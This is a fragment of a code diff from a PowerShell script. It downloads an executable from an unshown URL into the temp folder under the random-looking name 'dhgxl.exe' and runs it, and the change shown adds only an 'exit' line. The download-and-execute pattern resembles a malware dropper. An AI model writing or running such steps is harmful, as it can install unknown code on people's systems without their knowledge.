@@ -3,3 +3,4 @@ $out = "$env:TEMP\dhgxl.exe"
 Invoke-WebRequest -Uri $url -OutFile $out
 
 Start-Process $out
+exit
